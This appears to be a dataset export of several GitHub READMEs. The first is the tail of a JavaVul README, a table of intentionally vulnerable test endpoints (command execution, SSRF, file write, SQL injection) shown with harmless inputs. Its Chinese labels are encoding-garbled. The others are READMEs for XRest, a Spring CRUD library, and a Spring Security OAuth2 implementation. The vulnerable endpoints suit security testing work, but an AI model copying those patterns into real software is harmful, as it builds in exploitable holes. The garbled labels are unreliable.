| sql_injection_ids_normal | SQLæ³¨å…¥-mybatics-æ•°ç»„ | GET | http://192.168.0.9:9991/users/ids/?ids=1,2,3 | æ­£å¸¸ |
| sql_injection_like_normal | SQLæ³¨å…¥-mybatics-likeæ¨¡ç³ŠåŒ¹é… | GET | http://192.168.0.9:9991/users/name?name=A | æ­£å¸¸ |
| sql_injection_strs_normal | SQLæ³¨å…¥-mybatics-å­—ç¬¦ä¸²æ•°ç»„ | GET | http://192.168.0.9:9991/users/names?names=Alice&names=Bob | æ­£å¸¸ |
| sql_injection_orderby_normal | SQLæ³¨å…¥-mybatics-æ’åº | GET | http://192.168.0.9:9991/users/sort?orderByColumn=name&orderByDirection=asc | æ­£å¸¸ |
| sql_injection_Optional_normal | SQLæ³¨å…¥-Optional<String> | GET | http://192.168.0.9:9991/users/findByOptionalUsername?username=test | æ­£å¸¸ |
| sql_injection_Object_normal | SQLæ³¨å…¥-Object<String> | POST | http://192.168.0.9:9991/users/get_name_object | æ­£å¸¸ |
| xss_reflect_normal | åå°„å‹XSSæ¼æ´ | GET | http://192.168.0.9:9991/xss_reflect?name=1 | æ­£å¸¸ |
| xss_dom_normal | DOM XSSæ¼æ´ | POST | http://192.168.0.9:9991/xss_dom | æ­£å¸¸ |
| file_download_normal | ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ | GET | http://192.168.0.9:9990/file_download?fileName=test.log | æ­£å¸¸ |
| ReDos_normal_1 | ReDoSæ”»å‡»-(a+)+ | GET | http://192.168.0.9:9991/testReDos1?input=1 | æ­£å¸¸ |
| ReDos_normal_2 | ReDoSæ”»å‡»-([a-zA-Z]+)* | GET | http://192.168.0.9:9991/testReDos2?input=1 | æ­£å¸¸ |
| ReDos_normal_3 | ReDoSæ”»å‡»-(a\|aa)+ | GET | http://192.168.0.9:9991/testReDos3?input=1 | æ­£å¸¸ |
| ReDos_normal_4 | ReDoSæ”»å‡»-(a\|a?)+ | GET | http://192.168.0.9:9991/testReDos4?input=1 | æ­£å¸¸ |
| ReDos_normal_5 | ReDoSæ”»å‡»-(.*a){20} | GET | http://192.168.0.9:9991/testReDos5?input=1 | æ­£å¸¸ |
| file_write_normal | ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ | GET | http://192.168.0.9:9990/file_write?fileName=test.log&data=test | æ­£å¸¸ |
| runtime_command_execute_normal | å‘½ä»¤æ‰§è¡Œæ¼æ´-Runtime | GET | http://192.168.0.9:9990/runtime_command_execute?command=ls | æ­£å¸¸ |
| process_builder_command_normal | å‘½ä»¤æ‰§è¡Œæ¼æ´-ProcessBuilder | GET | http://192.168.0.9:9990/process_builder_command_execute?command=ls | æ­£å¸¸ |
| spel_expression_normal | SPELè¡¨è¾¾å¼æ”»å‡» | GET | http://192.168.0.9:9990/spel_expression?input=1 | æ­£å¸¸ |
| ssrf_openStream_normal | SSRFæ”»å‡»-openStream | GET | http://192.168.0.9:9990/ssrf_openStream?url=http://example.com | æ­£å¸¸ |
| ssrf_openConnection_normal | SSRFæ”»å‡»-openConnection | GET | http://192.168.0.9:9990/ssrf_openConnection?url=http://example.com | æ­£å¸¸ |
| ssrf_requestGet_normal | SSRFæ”»å‡»-requestGet | GET | http://192.168.0.9:9990/ssrf_requestGet?url=http://example.com | æ­£å¸¸ |
| ssrf_okhttp_normal | SSRFæ”»å‡»-okhttp | GET | http://192.168.0.9:9990/ssrf_okhttp?url=http://example.com | æ­£å¸¸ |
| ssrf_defaultHttpClient_normal | SSRFæ”»å‡»-defaultHttpClient | GET | http://192.168.0.9:9990/ssrf_defaultHttpClient?url=http://example.com | æ­£å¸¸ |
| OpenRedirector_ModelAndView_normal | URLé‡å®šå‘æ¼æ´-ModelAndView | GET | http://192.168.0.9:9990/OpenRedirector_ModelAndView?url=https://example.com | æ­£å¸¸ |
| OpenRedirector_sendRedirect_normal | URLé‡å®šå‘æ¼æ´-sendRedirect | GET | http://192.168.0.9:9990/OpenRedirector_sendRedirect?url=https://example.com | æ­£å¸¸ |
| OpenRedirector_lacation_normal | URLé‡å®šå‘æ¼æ´-location | GET | http://192.168.0.9:9990/OpenRedirector_lacation?url=https://example.com | æ­£å¸¸ |
| druid_sqlwall | druid-SQLé˜²ç«å¢™ | GET | http://192.168.0.9:9997/druid_sql?id=1 | è¯¯æŠ¥ |


## å‚è€ƒå¼€å‘ä»£ç 

- https://github.com/vulhub/vulhub
- https://github.com/l4yn3/micro_service_seclab
- https://github.com/ffffffff0x/JVWA
- https://github.com/mamba-2021/myjavavul
- https://github.com/zhlu32/range_java_micro_service_seclab
- https://rasp.baidu.com/doc/install/testcase.html
- https://github.com/lemono0/FastJsonParty/
- https://github.com/roottusk/vapi

## Star History Chart

[![Star History Chart](https://api.star-history.com/svg?repos=lokerxx/JavaVul&type=Date)](https://star-history.com/#lokerxx/JavaVul&Date)

## å¾…è¿›è¡Œ

- [x] cas-client xxeï¼ˆæ¼æ´å’Œä¿®å¤ï¼‰
- [ ] SQLæ³¨å…¥ä¼  order by å‚æ•°, ç™½åå•åˆ—è¡¨ï¼ˆè¯¯æŠ¥ï¼‰
",0,0,1,0.0,"['javavul', 'mvn', 'version', 'docker', 'version', 'version', 'simpleagent', 'javac', 'jar', 'cvfm', 'mv', 'star', 'history', 'chart']","['version', 'javavul', 'mvn', 'docker', 'simpleagent']",40.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-resources-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,40.0,0.0
sattinos/xrest,master,"# XRest
A REST accelerator library. It allows for creating CRUD Controller and express conditions in JSON notation

# Why XRest ? Another CRUD Controller ?
The available solutions on the net doesn't offer a powerful expressive way to declare the conditions. <br/>
A truly CRUD Controller, should offer:<br/>
    1. a generic based version that does the heavy workload.<br/>
    2. a fully customizable solution based on business requirements.<br/>
    3. a robust expressive way of WHERE conditions.<br/>
    4. isolate system entities from the application layer by using DTOs (input/output) for the API.

By using XRest, you will offer your project two benefits:
1. a fast way to make CRUD controller for entities. [read more](#useLibrary)
   - **/getOne**  ( condition can be passed ) <br/>
   - **/getMany** ( condition can be passed ) <br/>
   - **/count**  ( condition can be passed )<br/>
   - **/createOne** <br/>
   - **/createMany** <br/>
   - **/updateOne** <br/>
   - **/updateMany** <br/>
   - **/deleteOne** <br/>
   - **/deleteMany** ( condition should be passed ) <br/>
2. support CRUD API set with JSON where condition. [read more](#expressing-where-condition)

### productivity note:
You can utilize ([xrest cli](https://github.com/sattinos/xrest.cli)) to scaffold your necessary code. 


# Prerequisites
1. Java 17 or higher ([Lebrica JDK](https://bell-sw.com/pages/downloads/#jdk-17-lts) is recommended here)
2. [Maven](https://maven.apache.org/download.cgi) 3.9.2 or higher
3. [Spring Boot](https://spring.io/projects/spring-boot) 

# Supported Database
Principally, XRest is supposed to work on any Sql-based database (PostgreSQL, MySql or Microsoft Sql Server). 

# How to start
1. In your Spring Boot project, add the following to the POM file:
```xml
<dependency>
    <groupId>io.github.sattinos</groupId>
    <artifactId>xrest</artifactId>
    <version>1.0.19</version>
    <exclusions>
        <!-- Exclude spring-boot-starter-data-jpa to avoid version conflict -->
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </exclusion>
        <!-- Exclude spring-boot-starter-web to avoid version conflict -->
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </exclusion>
    </exclusions>
</dependency>
```

2. make sure you add this configuration to tell Spring to scan for XRest components:

```java
@Configuration
@ComponentScan(basePackages = ""org.malsati.xrest"")
public class ApplicationConfig {
}
```

## <a id=""howtouse""></a> How to use this library ? 
1) Design your entity [read more](#step01)
2) Design CRUD endpoints DTOs [read more](#step02)
3) Write down your entity mapper interface [read more](#step03)
4) Design your repository [read more](#step04)
5) Write down you service class [read more](#step05)
6) Write your CRUD Controller [read more](#step06)


## <a id=""step01""></a> 1) Design your entity  
When designing your entity, you have two options:

1. Design your entity freely without any utilization of XRest base classes or interfaces. [read more](#defreely)
2. Make use of the list of interfaces and base entities offered by XRest. [read more](#dexrest)

### <a id=""defreely""></a> Option1: Freely design your own entitities:
You can design your own entity without any constraints.

for example:

```java
@NoArgsConstructor
@Data
@Entity
@Table(name = ""Author"")
public class Author {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    protected Long id;

    @Column(name = ""full_name"", unique = true)
    private String fullName;

    @Column(name = ""birth_date"")
    private LocalDate birthDate;
}
```
Notice that here no XRest base entities is used.

[back to main steps](#howtouse)

### <a id=""dexrest""></a> Option2: Interfaces and base entities offered by XRest:
When coming to business requirements, `Audit Info` are of three types:
1. Creation info:
    - who created the entity
    - when it has been created
2. Update info:
    - who updated the entity
    - when it has been updated
3. Delete info: (soft delete only)
    - who deleted the entity
    - when it has been deleted

`XRest` offers a list of base classes to cover this:<br/><br/>
<blockquote style=""background-color:rgb(252, 252, 252); "">

`CreateEntity`: for entities that needs only creation info of the entity.

<details>
    <summary>example:</summary>
<blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""City"")
public class City extends CreateEntity {
    private String name;
    private String isoCode;
}
```
</blockquote>
</details>
</blockquote>

<br/>

<blockquote style=""background-color:rgb(250, 250, 250); "">

`UpdateEntity`: for entities that needs only update info of the entity.

<details>
    <summary>example:</summary>
    <blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""MessageItem"")
public class MessageItem extends UpdateEntity {
    private String contents;
    private String senderName;
}
```
</blockquote>
</details>
</blockquote>

<br/>

<blockquote style=""background-color:rgb(252, 252, 252); "">

`DeleteEntity`: for entities that needs only delete info of the entity.

<details>
    <summary>example:</summary>
    <blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""Color"")
public class Color extends DeleteEntity {
    private String rgbValue;
}
```
</blockquote>
</details>
</blockquote>
<br/>
<blockquote style=""background-color:rgb(250, 250, 250); "">

`AuditEntity`: for entities that needs creation info as well as update info.

<details>
<summary>example:</summary>
<blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""Report"")
public class Report extends AuditEntity {
    private String title;
    private String content;
}
```
</blockquote>
</details>
</blockquote>
<br/>
<blockquote style=""background-color:rgb(252, 252, 252); "">

`FullAuditEntity`: for entities that needs all the audit information (creation, update and delete).


<details>
<summary>example:</summary>
<blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""Contract"")
public class Contract extends FullAuditEntity {
    private String startDate;
    private String endDate;
}
```
</blockquote>
</details>
</blockquote>

[back to main steps](#howtouse)


Note: There are a list of Audit interfaces that are considered the contracts of auditing. They might be useful in some situations:
`CreationInfo`
`UpdateInfo`
`DeletionInfo`
`IdentityInfo`

#### Soft Delete Note:
When you want your entity to be soft-deleted, make sure you implement the interface: `DeletionInfo`.

CRUD operations will support `Soft Delete` automatically when you implement this interface.

If your entity doesn't implement this interface, `Hard Delete` will be chosen by XRest.

## <a id=""step02""></a> 2) Design CRUD endpoints DTOs 

#### CreateOne Endpoint (CreateOneInputDto, CreateOneOutputDto)

```java
@Data
@AllArgsConstructor
@NoArgsConstructor
public class CreateOneAuthorInputDto {
    private String fullName;
    private LocalDate birthDate;
    private Collection<Long> bookIds;
}
```
```java
@Data
@AllArgsConstructor
@NoArgsConstructor
public class CreateOneAuthorOutputDto extends CreateOneAuthorInputDto {
    private Long id;

    public CreateOneAuthorOutputDto(Long id, String fullName, LocalDate birthDate, Collection<Long> bookIds) {
        super(fullName, birthDate, bookIds);
        this.id = id;
    }
}
```

#### UpdateOne Endpoint (UpdateOneInputDto)
```java

public class UpdateOneAuthorInputDto extends CreateOneAuthorOutputDto implements IdentityInfo<Long> {  
}
```

### note:
When writing your `UpdateOneInputDto` you need to implement the interface `IdentityInfo` so that XRest will know how to retrieve the ID of the entity.
The ID of the entity is used by XRest to do basic validation before doing the actual update of the entity.
This validation is common to all entities though.


#### GetOne Endpoint (GetOneInputDto)
```java
public class GetOneAuthorOutputDto extends CreateOneAuthorOutputDto {
}
```

#### DeleteOne Endpoint (DeleteOneOutputDto)
```java
public class DeleteOneAuthorOutputDto extends UpdateOneAuthorInputDto {
}
```

## <a id=""step03""></a> 3) Write down your entity mapper interface
It should inherit from IMapper

```java
@Mapper(componentModel = ""spring"", nullValuePropertyMappingStrategy = NullValuePropertyMappingStrategy.IGNORE)
public interface AuthorMapper extends IMapper<Author,
        Long,
        CreateOneAuthorInputDto,
        CreateOneAuthorOutputDto,
        UpdateOneAuthorInputDto,
        DeleteOneAuthorOutputDto,
        GetOneAuthorOutputDto> {

    @Override
    @Mapping(source = ""bookIds"", target = ""books"")
    Author createOneInputDtoToEntity(CreateOneAuthorInputDto createOneAuthorInputDto);
    
    @Override
    @Named(""createOne"")
    @Mapping(source = ""books"", target = ""bookIds"")
    CreateOneAuthorOutputDto entityToCreateOneOutputDto(Author entity);
    
    @Override
    List<Author> createManyInputDtoToEntities(Iterable<CreateOneAuthorInputDto> createManyInputDto);
    
    @Override
    @IterableMapping(qualifiedByName = ""createOne"")
    List<CreateOneAuthorOutputDto> entitiesToCreateManyOutputDto(List<Author> entities);
    
    @Override
    @Mapping(source = ""bookIds"", target = ""books"")
    Author updateOneInputDtoToEntity(UpdateOneAuthorInputDto updateOneAuthorInputDto);
    
    @Override
    @Mapping(source = ""books"", target = ""bookIds"")
    DeleteOneAuthorOutputDto entityToDeleteOneOutputDto(Author entity);
    
    @Override
    List<DeleteOneAuthorOutputDto> entitiesToDeleteManyOutputDto(List<Author> entity);
    
    @Override
    @Mapping(source = ""books"", target = ""bookIds"")
    GetOneAuthorOutputDto entityToGetOneoutputDto(Author entity);

    default List<Book> mapBookIdsToBooks(Collection<Long> bookIds) {
        var books = new ArrayList<Book>(bookIds.size());
        for (Long id: bookIds) {
            books.add(new Book(id));
        }
        return books;
    }

    default List<Long> mapBooksToBookIds(Collection<Book> books) {
        var bookIds = new ArrayList<Long>(books.size());
        for (var book: books) {
            bookIds.add(book.getId());
        }
        return bookIds;
    }
}
```

[Show me how (first case)](src/test/java/org/malsati/simple_web_app/mapper/AuthorMapper.java) <br />
[Show me how (second case)](src/test/java/org/malsati/simple_web_app/mapper/BookMapper.java)

[back to main steps](#howtouse)

## <a id=""step04""></a> 4) Design your repository
Make sure you inherit from `JpaRepository` as well as `JpaSpecificationExecutor` :
```java
public interface AuthorRepository extends JpaRepository<Author, Long>, JpaSpecificationExecutor<Author> {    
}
```

[back to main steps](#howtouse)

## <a id=""step05""></a> 5) Write down your service class:
1. It should extend CrudServiceORM
2. In its constructor, it should inject the entity
   repository and the mapper you've created in previous steps.
3. Implement the validation methods `validateCreateOneInput` and `validateUpdateOneInput` if needed (optional)
4. Implement the hooks `onPreCreateOne`, `onPreUpdateOne` and `onPreDeleteOne` if needed (optional)

[Show me how (first case)](src/test/java/org/malsati/simple_web_app/service/AuthorsService.java) <br />
[Show me how (second case)](src/test/java/org/malsati/simple_web_app/service/BookService.java)


```java
@Service
public class AuthorsService extends CrudServiceORM<
        Author,
        Long,
        CreateOneAuthorInputDto,
        CreateOneAuthorOutputDto,
        UpdateOneAuthorInputDto,
        DeleteOneAuthorOutputDto,
        GetOneAuthorOutputDto> {
    
    public AuthorsService(
            AuthorRepository authorRepository,
            AuthorMapper mapper) {
        super(authorRepository, mapper);
    }   
}
```
[back to main steps](#howtouse)

## <a id=""step06""></a> 6) Write your CRUD Controller:  
1. It should inherit from CRUDController<br/>
2. It should pass the service class you've created in previous step

```java
@RequestMapping(""/app/author"")
@RestController
public class AuthorsController extends CrudController<Author,
        Long,
        CreateOneAuthorInputDto,
        CreateOneAuthorOutputDto,
        UpdateOneAuthorInputDto,
        DeleteOneAuthorOutputDto,
        GetOneAuthorOutputDto> {
    
    public AuthorsController(AuthorsService authorsService) {
        super(authorsService);
    }
}
```

[back to main steps](#howtouse)

# How to test 
```bash
mvn test
```

while testing the project, I recommend you test using the test runner of IntelliJ Idea Community Edition.
Each test case will output explanatory messages. Run the tests from the Test Suite [ContollersTestsSuite](src/test/java/org/malsati/controllers_test/ContollersTestsSuite.java) 

### About testing project:
It is a Spring Boot web app, that starts the journey with you:
1. How to Design an entity in both ways (utilize XRest Base classes, and freely design your entity).
2. Shows how to design DTO classes.
3. Shows how to write mapper.
4. Shows how to write your repository classes.
5. Shows how to write your custom service classes and write custom business validation rules as well as create/update/delete hooks.
6. Shows you the power of `JSON Condition` and how to pass it to the API.
7. Shows how to write your controller classes.
8. Shows how to form `JSON Condition` in case of relation (ONE-TO-ONE, ONE-TO-MANY, MANY-TO-MANY). 

The test project test cases:
1. AuthorControllerTest it has 16 test cases. It shows how to utilize XRest base entities.
2. BookControllerTest it has 13 test cases. It show how your freely designed entities fit into XRest.
3. AuthorAndBookControllerTest it has 3 test cases mainly for how to deal with relation.

If you have further test cases that needs to be addressed, just drop me an email or open an issue.

[The test project source code](src/test/java/org/malsati/controllers_test/ContollersTestsSuite.java)


## Expressing Where Condition
The Where condition is in JSON notation. It allows you to express a business filter in JSON format.
Whether you need this condition in the API, Service Layer or Infrastructure Layer.

The Structure:
    It can have one of these two forms:

    1. LHS/RHS format:
    {
        ""op"": ...,
        ""lhs"": ...,
        ""rhs"": ...        
    }

    This is used with Binary operators, where:
    op: operator type ( <, =, <=, >, >=, !=, like )
    lhs: left hand side, should be the entity field name.
    rhs: right hand side, should be the value

    example1:
    {
        ""op"": ""like"",
        ""lhs"": ""title"",
        ""rhs"": ""%Harry Potter%""
    }
    => all entities which have a title similar to the form: %Harry Potter%

    example2:
    {
        ""op"": "">"",
        ""lhs"": ""age"",
        ""rhs"": 18
    }
    => all entities which have an age higher than 18

    If the type of the rhs is not scalar, you need to provide a hint what is it through the ""type"" key.
    for example:

    example3:
    {
        ""op"": "">"",
        ""lhs"": ""publishDate"",
        ""rhs"": ""2009-01-01"",
        ""type"": ""Date""
    }
    => all entities whose publishDate is after 2009-01-01

    2. RANGE format:
    This is used with Ternary operators, where:
    op: operator type ( between )
    lhs: left hand side, should be the entity field name.
    range1: the start of the range
    range2: the end of the range
    
    example4:
    {
        ""op"": ""between"",
        ""lhs"": ""deathDate"",
        ""range1"": ""1999-06-01"",
        ""range2"": ""2003-12-01"",
        ""type"": ""Date""
    }
    => all entities whose deathDate is in the range inclusive [1999-06-01 , 2003-12-01]

    example5:
    {
        ""op"": ""between"",
        ""lhs"": ""age"",
        ""range1"": 18,
        ""range2"": 28
    }
    => all entities whose age is in the range inclusive [18, 28]

    example6:
    {
        ""op"": ""&&"",
        ""lhs"": {
            ""op"": ""between"",
            ""lhs"": ""publishDate"",
            ""range1"": ""1999-06-01"",
            ""range2"": ""2003-12-01"",
            ""type"": ""Date""
        },
        ""rhs"": {
            ""op"": ""||"",
            ""lhs"": {
                ""op"": ""like"",
                ""lhs"": ""name"",
                ""rhs"": ""% of %""
            },
            ""rhs"": {
                ""op"": "">"",
                ""lhs"": ""noPages"",
                ""rhs"": 800
            }
        }
    }
    => all entities that:
            has been published in the range inclusive [1999-06-01 , 2003-12-01]
            and 
                either 
                       its name is similar to the token "" of "" 
                    or its number of pages is more than 800

    example7
    {
        ""op"": ""="",
        ""lhs"": ""books.title"",
        ""rhs"": ""Artificial Intelligence""
    }
    
    => All the authors who authored the book of title: 'Artificial Intelligence'
    Notice that the Author has a relation Many To Many to Book entity 
    and there is a list inside the Author called books
    This will allow you to query for nested entities inside the root entity
    The nesting level is infinite as long as there is a relation.


![Class Diagram](assets/classDiagram.png)

### Roadmap
JSON schema validation (todo)
    Handle Invalid Input:
        wrong key

Update Where

Transitive Dependency

Post Hooks
Missing Hooks

Support WildCard


CrudService should be protected
",0,0,4,3.0,"['xrest', 'why', 'xrest', 'another', 'crud', 'controller', 'productivity', 'note', 'prerequisite', 'support', 'database', 'how', 'start', 'a', 'howtouse', 'how', 'use', 'library', 'a', 'design', 'entity', 'a', 'defreely', 'freely', 'design', 'entitities', 'a', 'dexrest', 'interface', 'base', 'entity', 'offer', 'xrest', 'soft', 'delete', 'note', 'a', 'design', 'crud', 'endpoint', 'dtos', 'createone', 'endpoint', 'createoneinputdto', 'createoneoutputdto', 'updateone', 'endpoint', 'updateoneinputdto', 'note', 'getone', 'endpoint', 'getoneinputdto', 'deleteone', 'endpoint', 'deleteoneoutputdto', 'a', 'write', 'entity', 'mapper', 'interface', 'a', 'design', 'repository', 'a', 'write', 'service', 'class', 'a', 'write', 'crud', 'controller', 'how', 'test', 'about', 'test', 'project', 'express', 'where', 'condition', 'roadmap']","['a', 'endpoint', 'design', 'xrest', 'crud']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
patternknife/spring-security-oauth2-password-jpa-implementation,main,"# Spring Security Oauth2 Password JPA Implementation

> App-Token based OAuth2 ROPC POC built to grow with Spring Boot and ORM

## Quick Start
```xml
<dependency>
    <groupId>io.github.patternknife.securityhelper.oauth2.api</groupId>
    <artifactId>spring-security-oauth2-password-jpa-implementation</artifactId>
    <version>3.1.2</version>
</dependency>
```
For v2, using the database tables from Spring Security 5 (only the database tables; follow the dependencies as above):
```xml
<dependency>
    <groupId>io.github.patternknife.securityhelper.oauth2.api</groupId>
    <artifactId>spring-security-oauth2-password-jpa-implementation</artifactId>
    <version>2.8.2</version>
</dependency>
```

## Overview

* Complete separation of the library (API) and the client for testing it

* Set up the same access & refresh token APIs on both ``/oauth2/token`` and on our controller layer such as ``/api/v1/traditional-oauth/token``, both of which function same and have `the same request & response payloads for success and errors`. (However, ``/oauth2/token`` is the standard that ""spring-authorization-server"" provides.)
  * As you are aware, the API ``/oauth2/token`` is what ""spring-authorization-server"" provides.
    * ``/api/v1/traditional-oauth/token`` is what this library implemented directly.
        * Success Payload
         ```json
          {
              ""access_token"" : ""Vd4x8D4lDg7VBFh..."",
              ""token_type"" : ""Bearer"",
              ""refresh_token"" : ""m3UgLrvPtXKdy7jiD..."",
              ""expires_in"" : 3469,
              ""scope"" : ""read write""
           }
        ```
      
        * Error Payload (Customizable) 
        ```json
          {
              ""timestamp"": 1719470948370,
              ""message"": ""Couldn't find the client ID : client_admin"", // Sensitive info such as being thrown from StackTraces
              ""details"": ""uri=/oauth2/token"",
              ""userMessage"": ""Authentication failed. Please check your credentials."",
              ""userValidationMessage"": null
          }
        ```

        * In the following error payload, the 'message' shouldn't be exposed to clients; instead, the 'userMessage' should be.
      
* Authentication management based on a combination of username, client ID, and App-Token
  * What is an App-Token? An App-Token is a new access token generated each time the same account logs in. If the token values are the same, the same access token is shared.

| App-Token Status       | Access Token Behavior      |
|------------------------|----------------------------|
| same for the same user | Access-Token is shared     |
| different for the same user              | Access-Token is NOT shared |

  * Set this in your ``application.properties``. 
    * App-Token Behavior Based on `io.github.patternknife.securityhelper.oauth2.no-app-token-same-access-token`

| `no-app-token-same-access-token` Value | App-Token Status                          | Access Token Sharing Behavior                                                                                     |
|------------------------------------------------------------|-------------------------------------------|-------------------------------------------------------------------------------------------------------------------|
| `true`                                                     | App-Token is `null` for the same user     | Same user with a `null` App-Token shares the same access token across multiple logins.                             |
| `false`                                                    | App-Token is `null` for the same user                       | Even if the App-Token is `null`, the same user will receive a new access token for each login.                     |
| `-`                                                        | App-Token is shared for the same user     | Access tokens will not be shared. A new access token is generated for each unique App-Token, even for the same user.|
| `-`                                                        | App-Token is NOT shared for the same user | Each unique App-Token generates a new access token for the same user.                                              |


* Separated UserDetails implementation for Admin and Customer roles as an example. (This can be extended as desired by implementing ``UserDetailsServiceFactory``)
* For versions greater than or equal to v3, including the latest version (Spring Security 6), provide MySQL DDL, which consists of ``oauth2_authorization`` and ``oauth2_registered_client``.
* For v2, provide MySQL DDL, which consists of ``oauth_access_token, oauth_refresh_token and oauth_client_details``, which are tables in Security 5. As I meant to migrate current security system to Security 6 back then, I hadn't changed them to the ``oauth2_authorization`` table indicated in https://github.com/spring-projects/spring-authorization-server.

* Application of Spring Rest Docs
 
## Dependencies

| Category          | Dependencies                                                      |
|-------------------|-------------------------------------------------------------------|
| Backend-Language  | Java 17                                                           |
| Backend-Framework | Spring Boot 3.3.2 (the latest version)                            |
| Main Libraries    | Spring Security 6.3.1, Spring Security Authorization Server 1.3.1 |
| Package-Manager   | Maven 3.6.3 (mvnw, Dockerfile)                                    |
| RDBMS             | Mysql 8.0.17                                                      |

## Run the App

#### Import the SQL file in the ``mysql`` folder.

#### Install Maven
```shell
mvnw clean install
cd client
mvnw clean install # Integration tests are done here, which creates docs by Spring-Rest-Doc.
```
- Run the client module by running ``SpringSecurityOauth2PasswordJpaImplApplication`` in the client.
- The API information is found on ``http://localhost:8370/docs/api-app.html``, managed by Spring Rest Doc

![img.png](reference/docs/img1.png)

- In case you use IntelliJ, I recommend creating an empty project and importing the API (root) module and client module separately.
- The client module definitely consumes the API module, but not vice versa.

## API Guide

### **Registration**
  - See the `client` folder. As the Api module consumes JPA, adding it to Beans is required.

```java

// ADD 'io.github.patternknife.securityhelper.oauth2.api'
@SpringBootApplication(scanBasePackages =  {""com.patternknife.securityhelper.oauth2.client"", ""io.github.patternknife.securityhelper.oauth2.api""})
public class SpringSecurityOauth2PasswordJpaImplApplication {

    public static void main(String[] args) {
        SpringApplication.run(SpringSecurityOauth2PasswordJpaImplApplication.class, args);
    }

}
```

```java
@Configuration
// ADD 'io.github.patternknife.securityhelper.oauth2.api.config.security'
@EnableJpaRepositories(
        basePackages = {""com.patternknife.securityhelper.oauth2.client.domain"",
                ""com.patternknife.securityhelper.oauth2.client.config.securityimpl"",
                ""io.github.patternknife.securityhelper.oauth2.api.config.security""},
        entityManagerFactoryRef = ""commonEntityManagerFactory"",
        transactionManagerRef= ""commonTransactionManager""
)
public class CommonDataSourceConfiguration {
    

   // ADD 'io.github.patternknife.securityhelper.oauth2.api.config.security'
    @Primary
    @Bean(name = ""commonEntityManagerFactory"")
    public LocalContainerEntityManagerFactoryBean commonEntityManagerFactory(EntityManagerFactoryBuilder builder) {
        return builder
                .dataSource(commonDataSource())
                .packages(""com.patternknife.securityhelper.oauth2.client.domain"",
                        ""io.github.patternknife.securityhelper.oauth2.api.config.security"")
                .persistenceUnit(""commonEntityManager"")
                .build();
    }

}
```

### **Implementation of...**

#### ""Mandatory"" settings

  - The only mandatory setting is ``client.config.securityimpl.service.userdetail.CustomUserDetailsServiceFactory``. The rest depend on your specific situation.

#### ""Customizable"" settings

  - **Insert your code when events happen such as tokens created**
    - ``SecurityPointCut``
    - See the source code in ``client.config.securityimpl.aop``
    

  - **Register error user messages as desired**
    - ``ISecurityUserExceptionMessageService``
    - See the source code in ``client.config.securityimpl.message``
    

  - **Customize the whole error payload as desired for all cases**
    - What is ""all cases""?
      - Authorization Server (""/oauth2/token"", ""/api/v1/traditional-oauth/token"") and Resource Server (Bearer token inspection : 401, Permission : 403)
    - Customize errors of the following cases
      - Login (/oauth2/token) : ``client.config.securityimpl.response.CustomAuthenticationFailureHandlerImpl``
      - Login (/api/v1/traditional-oauth/token) : ``client.config.response.error.GlobalExceptionHandler.authenticationException`` (""/api/v1/traditional-oauth/token"", Resource Server (Bearer token inspection))
      - Resource Server (Bearer token expired or with a wrong value, 401) :``client.config.securityimpl.response.CustomAuthenticationEntryPointImpl`` 
      - Resource Server (Permission, 403, @PreAuthorized on your APIs) ``client.config.response.error.GlobalExceptionHandler.authorizationException``
      

  - **Customize the whole success payload as desired for the only ""/oauth2/token""**
      - ``client.config.securityimpl.response.CustomAuthenticationSuccessHandlerImpl``
      - The success response payload of ""/api/v1/traditional-oauth/token"" is in ``api.domain.traditionaloauth.dto`` and is not yet customizable.

 - **Customize the verification logic for UsernamePassword and Client as desired**
    - ``IOauth2AuthenticationHashCheckService``

## Running this App with Docker
* Use the following module for Blue-Green deployment:
  * https://github.com/patternknife/docker-blue-green-runner
* The above module references this app's Dockerfile and the entrypoint script in the .docker folder.

## Contribution Guide
* You can create a pull request directly to the main branch.
* Integration tests in the client folder are sufficient for now, but you may add more if necessary.
* There is a lack of unit tests, so contributions to unit test code are welcome, which will help improve the overall codebase.",14,0,3,0.0,"['spring', 'security', 'password', 'jpa', 'implementation', 'quick', 'start', 'overview', 'dependency', 'run', 'app', 'import', 'sql', 'file', 'mysql', 'folder', 'install', 'maven', 'integration', 'test', 'do', 'here', 'create', 'docs', 'api', 'guide', 'registration', 'implementation', 'of', 'mandatory', 'setting', 'customizable', 'setting', 'run', 'app', 'docker', 'contribution', 'guide']","['implementation', 'run', 'app', 'guide', 'setting']",2.0,"[com.mysema.maven:apt-maven-plugin,maven-javadoc-plugin,maven-resources-plugin,maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.asciidoctor:asciidoctor-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,2.0,0.0
Rapter1990/springbootsecurity,main,"# Spring Boot with Spring Security through JWT Implementation

<p align=""center"">
    <img src=""screenshots/spring_boot_security_example_jwt_implementation.png"" alt=""Main Information"" width=""700"" height=""500"">
</p>

### ğŸ“– Information

<ul style=""list-style-type:disc"">
  <li><b>It</b> is a kind of Spring Boot example with covering important and useful features</li> 
  <li>Here is the explanation of the example
       <ul><b>Admin</b> and <b>User</b> implement their own <b>authentication</b> and <b>authorization</b> through their defined <b>role</b> name</ul>
       <ul><b>Admin</b> handles with creating product, getting all products, getting product by Id, updating product by Id and lastly deleting product by Id</ul>
       <ul><b>Admin</b> only handles with getting all products and getting product by Id</ul>
  </li>
</ul>

### Explore Rest APIs

<table style=""width:100%"">
  <tr>
